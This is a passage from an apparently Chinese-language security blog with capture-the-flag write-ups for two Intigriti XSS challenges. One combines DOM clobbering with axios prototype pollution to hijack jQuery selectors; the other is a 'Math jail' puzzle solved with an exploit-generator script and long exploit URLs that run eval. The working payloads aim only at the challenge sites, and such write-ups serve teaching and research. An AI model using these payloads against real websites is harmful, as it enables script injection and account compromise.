unintended，難怪難度比我想得要低。 預期解法也沒這麼難…嗎？知道自己的解法是非預期之後，就開始思考起什麼才是預期解，作者有在 Discord 裡面說預期解法跟現在的非預期解法，使用到的地方完全不同，因此可以想像是把 attr(&#123;&#125;) 那一段排除，留下剩下的程式碼，就只剩這些： function search(name) &#123; $(\"img.loading\").attr(\"hidden\", false); axios.post(\"/search\", $(\"#search\").get(0), &#123; \"headers\": &#123; \"Content-Type\": \"application/json\" &#125; &#125;).then((d) => &#123; $(\"img.loading\").attr(\"hidden\", true); const repo = d.data; if (!repo.owner) &#123; alert(\"Not found!\"); return; &#125;; $(\"img.avatar\").attr(\"src\", repo.owner.avatar_url); $(\"#description\").text(repo.description); &#125;); &#125;; 剩下的程式碼中，我的直覺告訴我重點是這一行： $(\"img.avatar\").attr(\"src\", repo.owner.avatar_url); 如果可以利用 prototype pollution 把 $(&quot;img.avatar&quot;) 變成 $(&#39;#homepage&#39;)，選到那個 iframe 的話，再搭配上我們可以掌握 repo.owner.avatar_url，就能把 iframe 的 src 設置成 javascript:alert(1)，達成 XSS。 我覺得這個猜測非常合理，大概有九成的把握是對的，因為透過 prototype pollution 來影響 selector 這個招數應該是新的，至少我之前沒看過，而且這個很酷！也符合了作者在推特上講的：「super interesting」 因此，接下來我就花了點時間開始尋找 selector 是怎麼運作的，但這段程式碼比我想像中複雜了不少，而且牽涉到許多函式。 花了四五個小時之後，終於找到一個可以利用的地方。 首先，在執行 $() 的時候，底層是用 find 來找到對應的元素，而這邊會有一個 documentIsHTML 的檢查，如果是 true 的話，基本上就會就是利用 querySelector 之類的原生 API 去尋找，沒有操作空間。 因此我們要先想辦法讓它是 false，判斷的程式碼在這裡，只要讓 isXMLDoc 回傳 true，documentIsHTML 就會是 false： isXMLDoc: function( elem ) &#123; var namespace = elem &amp;&amp; elem.namespaceURI, docElem = elem &amp;&amp; ( elem.ownerDocument || elem ).documentElement; // Assume HTML when documentElement doesn't yet exist, such as inside // document fragments. return !rhtmlSuffix.test( namespace || docElem &amp;&amp; docElem.nodeName || \"HTML\" ); &#125;, 我們可以透過 DOM clobbering 去覆蓋掉 documentElement，來讓 docElem 變成一個 &lt;img&gt;，因為不是 &lt;html&gt;，就可以讓檢查失效，並且讓 isXMLDoc 變成 true。 繞過了檢查以後，就暫時不會用原生的那些 API，而是執行到 select 函式，開頭會先將 selector 做 tokenize： function tokenize( selector, parseOnly ) &#123; var matched, match, tokens, type, soFar, groups, preFilters, cached = tokenCache[ selector + \" \" ]; if ( cached ) &#123; return parseOnly ? 0 : cached.slice( 0 ); &#125; // ... &#125; 這邊看起來就是我們要找的地方了！ 只要污染 img.avatar ，就可以控制 tokenCache 的內容，進而影響到 tokenize 的結果，直接把結果替代成我們要選的 iframe。 看來預期解法也沒這麼難嘛。 但嘗試過後，發現沒有用。 沒有用的原因不是因為 gadget 找錯，而是因為 prototype pollution 的部分。此時，就被逼得回頭研究之前偷懶只看 exploit 的 axios 漏洞。 Axios 在把 form 的名稱轉成 JSON 的 key 時，是這樣運作的： /** * It takes a string like `foo[x][y][z]` and returns an array like `['foo', 'x', 'y', 'z'] * * @param &#123;string&#125; name - The name of the property to get. * * @returns An array of strings. */ function parsePropPath(name) &#123; // foo[x][y][z] // foo.x.y.z // foo-x-y-z // foo x y z return utils.matchAll(/\\w+|\\[(\\w*)]/g, name).map(match => &#123; return match[0] === '[]' ? '' : match[1] || match[0]; &#125;); &#125; 會把 A-Za-z0-9_ 以外的字元都當作分隔符號，因此空白沒辦法成為屬性名稱的一部分。我在這邊花了三四個小時，沒有找到任何可以繞過的方式。 此時我知道我錯了，這題真的沒這麼簡單… 人生三大錯覺之一：我能解開過了一天以後，繼續看這道題目，既然沒辦法用空白，那應該是有其他地方可以利用，於是就接著追蹤程式碼的運作。 繼續一直往下追的話，會追到 matcherFromTokens 這個函式，但裡面的程式碼一樣又多又複雜，於是我第一次看到的時候心裡想著：「算了吧，還是等解答好了」。 但過了一天之後重振精神，再次從頭開始看起，發現其實在進入 tokenize 之前，就有一個地方可以污染了： function select( selector, context, results, seed ) &#123; var i, tokens, token, type, find, compiled = typeof selector === \"function\" &amp;&amp; selector, match = !seed &amp;&amp; tokenize( ( selector = compiled.selector || selector ) ); // ... &#125; 這邊有個 selector = compiled.selector || selector，那只要污染 selector，我不就可以任意更改 selector 了嗎？ 正當我為自己的聰明沾沾自喜時，現實馬上跑過來打了我一巴掌，污染了 selector 之後，在進入到 tokenize 時出錯了，因為裡面有一段是： // Filters for ( type in filterMatchExpr ) &#123; if ( ( match = jQuery.expr.match[ type ].exec( soFar ) ) &amp;&amp; ( !preFilters[ type ] || ( match = preFilters[ type ]( match ) ) ) ) &#123; matched = match.shift(); tokens.push( &#123; value: matched, type: type, matches: match &#125; ); soFar = soFar.slice( matched.length ); &#125; &#125; 因為污染了 selector，所以在執行 type in filterMatchExpr 的時候，被污染的 selector 就會被取出來，接著執行到 jQuery.expr.match[ type ].exec，由於字串並沒有 exec 這個方法，所以就會報錯。 也就是說，不管我們污染了什麼，只要進入到 tokenize 就會出錯，所以想要把 selector 直接污染成 iframe 是辦不到的。 但沒關係，我們可以把 selector 污染成之前已經在 cache 裡面的東西，例如說 img.loading，就可以繞過 tokenize。 但這也只是不讓程式壞掉而已，依舊沒辦法把題目解開。 還是得靠提示又過了一兩天，看到了作者在推特上的提示，直接明確指出關鍵就在於我之前因為太複雜所以略過的 addCombinator，從提示中可以看出，我確實只差最後一步了。 因此又硬著頭皮花了半天左右，稍微 trace 了一下這部分的程式碼，最後才終於得到預期的答案。 先附上最後的 payload： &lt;img name=documentElement> &lt;form id=\"search\"> &lt;input name=\"__proto__.owner.avatar_url\" value=\"javascript:alert(document.domain)\"> &lt;input name=\"__proto__.CLASS.a\" value=\"1\"> &lt;input name=\"__proto__.TAG.a\" value=\"1\"> &lt;input name=\"__proto__.dir\" value=\"parentNode\"> &lt;input name=\"__proto__.selector\" value=\"img.loading\"> &lt;/form> 其實最後一部分 addCombinator 那邊有點像是一半用猜的，一半是真的知道，大概就是某一個部分會用 dir 來找匹配的元素，設定成 parentNode 之後就會一直往上找，然後就會配對到整個 HTML 的元素，因此就會幫每一個 element 都加上 src，裡面當然也包含了 iframe。 但每一個函式的細節我已經忘記了，因為真的有點複雜，如果有興趣知道的話，可以直接去看原作者的 writeup（底下會附上連結）。 後記我很喜歡這道題目那種循序漸進的感覺，從一開始找到非預期解以為很簡單，到後來找到第一個 cache 的地方以為解開了，卻回頭發現 axios 的 prototype pollution 沒辦法搭配使用，接著找到第二個 compiled.seletor 也以為結束了，才發現其實還沒。 要一直再往下深追，追到 addCombinator，才能確定這一題是真的可以解開，能在一道題目裡面情緒起伏這麼多次，代表這個題目設計的很好。另一個我很喜歡的點是這是一道逼迫你 code review 的題目，沒看 code 的話是絕對解不開的。我很喜歡 code review，因此也很喜歡這個題目。 很佩服作者能夠繼續往深處探索，找到這個非常有趣的答案，結合了 DOM clobbering 跟 prototype pollution，修改了 jQuery selector 的指向，出了一題這麼好玩的題目！ 再次推薦作者本人的 writeup，跟我經歷了差不多的過程：Intigriti January 2024 - XSS Challenge 除此之外，@joaxcar 找到的另外一個非預期解也很有趣，有興趣的可以看看：Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge) 若是對最一開始的題目有興趣，也可以參考這邊：https://bugology.intigriti.io/intigriti-monthly-challenges/0124","link":"/2024/02/17/intigriti-0124-writeup/"},{"title":"Intigriti 0823 挑戰 - Math jail 解法以及心得","text":"我在 Intigriti 的每月挑戰中出了一道 XSS 的題目，被我稱之為「Math jail」，連結如下：https://challenge-0823.intigriti.io/ 而現在挑戰結束了，因此這篇文章就來講講出題的想法跟解法。 Math jail 的構想來自於 Hack.lu CTF 2022 的一道題目，名為「Culinary Class Room」，那一題讓你在一個 Python class 上面加上許多 decorator，但是不能有參數，而目標是能執行任意程式碼。 decorator 其實也只是一個 function call，換句話說，就是你只能用以下這種形式的程式碼：a(b(c(d(e(f())))))，該怎麼做到能夠執行任何你想要的功能？ 類似的題目也曾出現在中國的 CTF，像是這篇就有寫到：PHP无参数RCE 而 Culinary Class Room 的解法是找到一個 list，往裡面 push 很多數字，最後轉成 bytes 然後丟到 eval 裡面去執行。 舉例來說，底下的程式碼會 push 112 這個數字到 copyright._Printer__filenames： @copyright._Printer__filenames.append @memoryview.__basicsize__.__sub__ @staticmethod.__basicsize__.__mul__ @object.__instancecheck__ class a:pass 當初看到這題以後，我就想說有沒有可能弄一個 JavaScript 的版本？於是 Math jail 就誕生了。 原本其實沒有限制一定要由 Math. 開頭，但後來發現這樣做比較有趣，而且如果不這樣做的話，直接 alert(document.domain.toString()) 就結束了，要過濾掉很多關鍵字才能封住，而且還可能會有 unintended。 接下來就講一下 Math jail 解法大概的思路是什麼。 解法的整體概念概念就跟前面提到的 Python 版本一樣，找一個 list 然後 push 東西進去，最後 join 然後拿去給 eval 執行，大概會像這樣： var arr = [] eval(arr.join(''.toString(arr.push('a'.toString())))) // Uncaught ReferenceError: a is not defined 上面的程式碼最後會執行 a，只要照著這個概念繼續做，就可以拼出 alert()，簡單舉個例子像是這樣： var arr = ['a','l','e','r'] eval( arr.join( ''.toString( arr.push( ')'.toString( arr.push( '('.toString( arr.push('t'.toString()) ) ) ) ) ) ) ) 因為我們每一個 function call 都不能有參數，所以像是 arr.join(&#39;&#39;) 這種的，可以改成 arr.join(&#39;&#39;.toString())，就能夠符合規則。 有了這個基本概念以後，接下來的問題就可以分成幾個部分： 怎麼找到一個可以用的陣列？ 怎麼找到想要的字元？ 怎麼 join？ 怎麼不用 eval 來執行？ 1. 找到陣列在題目中有特別給了一個陣列 Math.seeds，我們只要先 pop 就可以把它清空，像是這樣： Math.seeds = [1,2,3,4] Math.seeds.pop(Math.seeds.pop(Math.seeds.pop(Math.seeds.pop()))) console.log(Math.seeds) // [] 如此一來，我們就有一個可以放東西的陣列能夠使用。 2. 找到想要的字元首先，我們可以看看我們想要的字元是否存在於 Math 當中，例如說 Math.abs.name 就可以拿到 &quot;abs&quot; 這個字元，搭配 at 來使用的話，Math.abs.name.at() 就會是 &quot;a&quot;。 所以呢，Math.seeds.push(Math.abs.name.at())，就可以讓 Math.seeds 的內容變成 [&quot;a&quot;]。 而 Arrar.prototype.push 的回傳值會是陣列的長度，因此目前是 1，所以如果能找到某個函式的第二個字是 l，就能減少函式呼叫的次數，是最好的方法。 講到這裡，你應該已經意識到這一題如果用手動的方式大概會累死，自動化會是更好的方式，因此就來寫個函式吧！ 我們可以用遞迴的方式去尋找能接觸到的物件的每一個屬性是否符合我們想要的規則，並且回傳路徑是什麼，實作如下： function findTargetFromScope(scope, matchFn, initPath='') &#123; let visited = new Set() let result = [] findTarget(scope, initPath) // return the shortest one return result.sort((a, b) => a.length - b.length)[0] function findTarget(obj, path) &#123; if(visited.has(obj)) return visited.add(obj) const list = Object.getOwnPropertyNames(obj) for(let key of list) &#123; const item = obj[key] const newPath = path ? path + \".\" + key : key try &#123; if (matchFn(item)) &#123; result.push(newPath) continue &#125; &#125; catch(err)&#123;&#125; if (item &amp;&amp; typeof item === 'object') &#123; findTarget(item, newPath) &#125; &#125; &#125; &#125; 用的時候這樣用： console.log(findTargetFromScope(Math, item => item.name.at(0) === 'a','Math')) // Math.abs console.log(findTargetFromScope(Math, item => item.name.at(1) === 'l','Math')) // Math.clz32 也可以稍微整理一下，變這樣比較好用： const findMathName = (index, char) => findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') console.log(findMathName(0, 'a')) // Math.abs console.log(findMathName(1, 'l')) // Math.clz32 剛剛有說過我們會先嘗試拿陣列的長度去找對應的字元，那如果找不到怎麼辦呢？ 我們可以再嘗試另外一種方式，那就是找固定的 index。 舉例來說，Math.LN2 是 0.69，而 Array.prototype.at 的參數如果是小數，會自動無條件捨去成整數，因此會變成 0。 所以，假設原本 arr.push() 回傳的是 2，我們只要在外面加上一層變成：Math.LN2.valueOf(arr.push())，就能讓現在的數字變回 0，就能用第 1 個字元去找我們想要的函式名稱。 像是這樣： Math.seeds = [] Math.seeds.push(Math.log.name.at(Math.LN2.valueOf(Math.seeds.push(Math.abs.name.at())))) 就能讓陣列的內容變成 [&#39;a&#39;, &#39;l&#39;]。 以此類推，我們可以多準備一點 index，我準備了四個： const mapping = [ ['Math.LN2.valueOf'], // 0 ['Math.LOG2E.valueOf'], // 1 ['Math.E.valueOf'], // 2 ['Math.PI.valueOf'], // 3 ] 做到這邊，我們需要的英文字母應該都能找到了，那符號呢？像是 ()，這該怎麼辦呢？ 這時就需要回想起來有一個很好用的 String.fromCharCode()，只要給它數字，就能夠轉成字串。 要從 Math 存取到 String 也很簡單，先找到任何一個字串以後存取它的 constructor 就好：Math.abs.name.constructor.fromCharCode 於是接下來的問題就變成，那要怎麼產生數字？ 都已經用 Math 了，那就寫一個搜尋的函式嘗試各種 Math 函式的組合吧！ function findTargetNumber(init, target) &#123; let queue = [[[], init]] let visited = new Set() return bfs(target) function bfs(target) &#123; while(queue.length) &#123; let [path, current] = queue.shift() for(let key of Object.getOwnPropertyNames(Math))&#123; if (typeof Math[key] !== 'function') continue let value = Math[key]?.(current) if (value &amp;&amp; !Number.isNaN(value)) &#123; let newPath = [`Math.$&#123;key&#125;`, ...path] if (value === target) &#123; return newPath &#125; if (newPath.length >= 10) return if (!visited.has(value)) &#123; visited.add(value) queue.push([newPath, value]) &#125; &#125; &#125; &#125; &#125; &#125; console.log(findTargetNumber(5, '('.charCodeAt(0))) // ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32'] 當我們拼出 alert 時，最後一個 push 的回傳值會是 5，而 ( 的 ASCII code 是 40，我們只要這樣做就能得到 40：Math.floor(Math.log2(Math.cosh(Math.clz32(5)))) 跟前面的程式碼拼接一下，就能得到 (： Math.abs.name.constructor.fromCharCode(Math.floor(Math.log2(Math.cosh(Math.clz32(5))))) 把這些整合起來，就能組成一個有我們想要的字元的陣列。 3. 怎麼 join？要把陣列 join 起來，我們需要找到空字串，才能把陣列變成我們想要的字串。 我一開始的想法是組出空白字元以後用 &quot; &quot;.trim()，但是空白字元也是經由別的函式拼出來的，會變成：fn().trim()，就違反了題目設定的規則。 幸好，還有另一種方式可以呼叫函式：String.prototype.trim.call(&quot; &quot;)，這樣也能拿到空字串。 我們可以利用前面找出 ( 的方法找到空白字元，最後再加上這一連串的呼叫即可，範例如下： // 假設我們已經有想要的陣列了 var arr = ['a','l','e','r','t','(',')'] console.log( arr.join(Math.abs.name.constructor.prototype.trim.call(Math.abs.name.constructor.fromCharCode(32))) ) // alert() 4. 怎麼不用 eval 來執行？除了 eval 以外，還有 function constructor 可以用，像是這樣： Function('alert()')() Function 的部分只要找到任何一個函式並且存取它的 constructor 即可： Math.abs.constructor('alert()')() 那最後的 () 該怎麼辦呢？ 跟剛剛一樣，我們可以用另一種方式呼叫函式，例如說 alert.call() 又可以寫成是 Function.prototype.call.call(alert)，因此我們要的程式碼如下： Math.abs.constructor.call.call(Math.abs.constructor('alert()')) 5. 拼裝起來我寫了一個 script 來產生程式碼，完整程式碼如下： function findTargetFromScope(scope, matchFn, initPath='') &#123; let visited = new Set() let result = [] findTarget(scope, initPath) // return the shortest one return result.sort((a, b) => a.length - b.length)[0] function findTarget(obj, path) &#123; if(visited.has(obj)) return visited.add(obj) const list = Object.getOwnPropertyNames(obj) for(let key of list) &#123; const item = obj[key] const newPath = path ? path + \".\" + key : key try &#123; if (matchFn(item)) &#123; result.push(newPath) continue &#125; &#125; catch(err)&#123;&#125; if (item &amp;&amp; typeof item === 'object') &#123; findTarget(item, newPath) &#125; &#125; &#125; &#125; function findTargetNumber(init, target) &#123; let queue = [[[], init]] let visited = new Set() return bfs(target) function bfs(target) &#123; while(queue.length) &#123; let [path, current] = queue.shift() for(let key of Object.getOwnPropertyNames(Math))&#123; if (typeof Math[key] !== 'function') continue let value = Math[key]?.(current) if (value &amp;&amp; !Number.isNaN(value)) &#123; let newPath = [`Math.$&#123;key&#125;`, ...path] if (value === target) &#123; return newPath &#125; if (newPath.length >= 10) return if (!visited.has(value)) &#123; visited.add(value) queue.push([newPath, value]) &#125; &#125; &#125; &#125; &#125; &#125; function buildExploit(arrName, content) &#123; let ans = [] let currentIndex = 0 let codeResult = '' for(let i=0; i&lt;5; i++) &#123; addFunction(`$&#123;arrName&#125;.pop`) &#125; const findMathName = (index, char) => findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') for(let char of content) &#123; // if we can find it in the Math for the current index, use it let result = findMathName(currentIndex, char) if (result) &#123; addFunction(`$&#123;result&#125;.name.at`) addFunction(`$&#123;arrName&#125;.push`) currentIndex++ continue &#125; const mapping = [ ['Math.LN2.valueOf'], // 0 ['Math.LOG2E.valueOf'], // 1 ['Math.E.valueOf'], // 2 ['Math.PI.valueOf'], // 3 ] // try to find Math.fn[i] == char let found = false for(let i=0; i&lt;mapping.length; i++) &#123; result = findMathName(i, char) if (result) &#123; addFunction(mapping[i][0]) addFunction(`$&#123;result&#125;.name.at`) addFunction(`$&#123;arrName&#125;.push`) currentIndex++ found = true break &#125; &#125; if (found) &#123; continue &#125; // if we can't, we use integer to make a string let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0)) mathResult.reverse() // remember to reverse cause the order for(let row of mathResult) &#123; addFunction(row) &#125; addFunction('Math.abs.name.constructor.fromCharCode') addFunction(`$&#123;arrName&#125;.push`) currentIndex++ &#125; // add eval structure // generate space then trim let spaceResult = findTargetNumber(currentIndex, ' '.charCodeAt(0)) spaceResult.reverse() // remember to reverse cause the order for(let row of spaceResult) &#123; addFunction(row) &#125; addFunction('Math.abs.name.constructor.fromCharCode') addFunction('Math.abs.name.constructor.prototype.trim.call') addFunction(`$&#123;arrName&#125;.join`) addFunction('Math.abs.constructor') addFunction('Math.abs.constructor.prototype.call.call') return ans.reverse().join(',') //return codeResult function addFunction(name)&#123; ans.unshift(name) codeResult = `$&#123;name&#125;($&#123;codeResult&#125;)` &#125; &#125; console.log(buildExploit('Math.seeds', 'alert(document.domain)')) 最後產生的結果為： Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call Exploit URL: https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call Arbitrary XSS上面的程式碼只是執行靜態的 alert(document.domain) 指令，那有可能執行任意的 JavaScript 程式碼嗎？ 只要找到一個夠短的 payload，看起來就沒什麼問題。 例如說 eval(location.hash.slice(1)) 雖然很短但還是有點長，如果用上面我提供的 script 去跑會卡住一下（因為我程式碼有些 bug），最後產生出一個長度 120 的結果，超過了 100。 但是另一個 payload eval(&quot;&#39;&quot;+location) 倒是沒問題，長度是 85： https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#&#39;;alert(document.domain+&#39;/arb-xss&#39;) 能夠達成執行任意程式碼以後，下一步就是盡可能找出最短的 operations。 Code golf 時間最短的 XSS payload雖然說剛剛的 eval(&quot;&#39;&quot;+location) 已經很短了，但以這題來說，還有一個更短的 payload。 我從 @DrBrix 學到了可以用 eval(parent.name) 來縮短長度，而且這個技巧聰明地利用了 iframe。 在原本題目裡面有特別設置了 name，就是為了確保 name 不要被覆蓋，而 https://challenge-0823.intigriti.io/ 這個頁面用 iframe 嵌入了 chanllenge/index.html，所以用 parnent.name 就可以存取到 https://challenge-0823.intigriti.io/ 這個頁面的 name。 因此，@DrBrix 的策略是這樣的，首先我們有一個自己的頁面，就叫做 exp.html 好了，在 exp.html 裡面新增一個 iframe，先把 name 設成 payload，再把 location 替換成 https://challenge-0823.intigriti.io，如此一來結構就變成了： - exp.html (top) --- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;) ------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html 接著就可以用 frames[0].frames[0] 存取到最底下的 iframe，並且把它跳轉到我們準備好的網址，變成這樣： - exp.html (top) --- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;) ------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html?q&#x3D;... 如此一來，就可以用 parent.name 存取到我們調整過的 name，程式碼如下： &lt;script> setTimeout(() => &#123; frames[0].frames[0].location.replace('https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random') &#125;,3000)&lt;/script> &lt;iframe srcdoc=' &lt;script> name = \"alert(document.domain)\" document.location = \"https://challenge-0823.intigriti.io/\" &lt;/script> '> &lt;/iframe> eval(parent.name) 是我能找到最短的 payload，第二短的是 location=parent.name 清空 Math.seeds之前是用 Math.seeds.pop() 來把內容清空，但其實這部分也可以再縮短！ @y0d3n 用了一個技巧是： Math.seeds.splice(Math.imul()) 這是因為 Math.imul() 的回傳值是 0，而 splice(0) 的意思是：「刪除第 0 個元素以後的資料」，所以整個陣列都被清空了。 得到空字串之前我自己是用了比較迂迴的方式產生空字串，但後來才發現其實用 Math.random.name 就可以得到空字串了。 之所以可以是因為這一段： Math.random = function () &#123; if (!this.seeds) &#123; this.seeds = [0.62536, 0.458483, 0.544523, 0.323421, 0.775465] next = this.seeds[new Date().getTime() % this.seeds.length] &#125; next = next * 1103515245 + 12345 return (next / 65536) % 32767 &#125; 注意這邊 function 後面沒有一個名稱，因此這個函式其實是匿名函式，所以我們是把一個匿名函式 assign 給 Math.random，因此 Math.random.name 就會是個空字串。 得到固定的數字之前我是用 Math.PI 這種內建的常數來得到固定的數字，而我後來從 @Astrid 那邊發現了還可以用 STRING.length.valueOf() 這種形式來拿到數字。 舉例來說，Math.isPrototypeOf.name.length.valueOf() 就會是 13，利用這種方式可以更快地拿到一個固定的數字。 拿到固定數字以後，就可以以更短的步驟去找到我們想要的數字，而 @Astrid 甚至還寫了一段程式碼把最短路徑找出來。 Final solution最後產生出來的 payload 一共 59 個操作，會執行 eval(parent.name)，需要搭配前面講過的 iframe 才能執行： Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call 產生的腳本如下： function findTargetFromScope(scope, matchFn, initPath='') &#123; let visited = new Set() let result = [] findTarget(scope, initPath) // return the shortest one return result.sort((a, b) => a.length - b.length)[0] function findTarget(obj, path) &#123; if(visited.has(obj)) return visited.add(obj) const list = Object.getOwnPropertyNames(obj) for(let key of list) &#123; const item = obj[key] const newPath = path ? path + \".\" + key : key try &#123; if (matchFn(item)) &#123; result.push(newPath) continue &#125; &#125; catch(err)&#123;&#125; if (item &amp;&amp; typeof item === 'object') &#123; findTarget(item, newPath) &#125; &#125; &#125; &#125; function findTargetNumber(init, target) &#123; let queue = [[[], init]] let visited = new Set() return bfs(target) function bfs(target) &#123; while(queue.length) &#123; let [path, current] = queue.shift() for(let key of Object.getOwnPropertyNames(Math))&#123; if (typeof Math[key] !== 'function') continue let value = Math[key]?.(current) if (value &amp;&amp; !Number.isNaN(value)) &#123; let newPath = [`Math.$&#123;key&#125;`, ...path] if (value === target) &#123; return newPath &#125; if (newPath.length >= 10) return if (!visited.has(value)) &#123; visited.add(value) queue.push([newPath, value]) &#125; &#125; &#125; &#125; &#125; &#125; function buildExploit(arrName, content) &#123; let ans = [] let currentIndex = 0 let codeResult = '' // @credit: @y0d3n addFunction('Math.imul') addFunction('Math.seeds.splice') const findMathName = (index, char) => findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') || findTargetFromScope(Math.abs.name.constructor, item => item.name.at(index) === char, 